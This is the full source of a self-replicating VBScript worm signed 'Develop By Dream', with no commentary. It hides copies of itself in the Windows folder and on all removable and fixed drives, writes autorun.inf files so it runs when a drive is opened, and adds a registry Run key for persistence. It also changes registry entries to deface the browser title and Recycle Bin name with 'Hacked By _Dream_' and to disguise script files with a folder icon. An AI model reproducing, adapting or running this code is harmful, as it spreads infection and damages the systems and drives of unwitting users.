'Develop By Dream
on error resume next
dim mysource,winpath,flashdrive,fs,mf,atr,tf,rg,nt,check,sd
atr = "[autorun]"&vbcrlf&"shellexecute=wscript.exe W32PT.dll.vbs"
set fs = createobject("Scripting.FileSystemObject")
set mf = fs.getfile(Wscript.ScriptFullname)
dim text,size
size = mf.size
check = mf.drive.drivetype
set text=mf.openastextstream(1,-2)
do while not text.atendofstream
mysource=mysource&text.readline
mysource=mysource & vbcrlf
loop
do
Set winpath = fs.getspecialfolder(0)
set tf = fs.getfile(winpath & "\W32PT.dll.vbs")
tf.attributes = 32
set tf=fs.createtextfile(winpath & "\W32PT.dll.vbs",2,true)
tf.write mysource
tf.close
set tf = fs.getfile(winpath & "\W32PT.dll.vbs")
tf.attributes = 39
for each flashdrive in fs.drives
If (flashdrive.drivetype = 1 or flashdrive.drivetype = 2) and flashdrive.path <> "A:" Then
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(flashdrive.path &"\MS32DLL.dll.vbs")
set tf=fs.getfile(flashdrive.path &"\W32PT.dll.vbs")
tf.attributes =32
set tf=fs.createtextfile(flashdrive.path &"\W32PT.dll.vbs",2,true)
tf.write mysource
tf.close
set tf=fs.getfile(flashdrive.path &"\W32PT.dll.vbs")
tf.attributes =39
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes = 32
set tf=fs.createtextfile(flashdrive.path &"\autorun.inf",2,true)
tf.write atr
tf.close
set tf =fs.getfile(flashdrive.path &"\autorun.inf")
tf.attributes=39
end if
next
set rg = createobject("WScript.Shell")
set rg2 = createobject("WScript.Shell")
rg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\W32PT",winpath&"\W32PT.dll.vbs"
rg.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Hacked By _Dream_"
rg.regwrite "HKCR\vbsfile\DefaultIcon","shell32.dll,2"
rg2.regwrite "HKCR\CLSID\{645FF040-5081" &_
             "-101B-9F08-00AA002F954E}\","Hacked By _Dream_"

if check <> 1 then
Wscript.sleep 200000
end if
loop while check<>1
set sd = createobject("Wscript.shell")
sd.run winpath&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
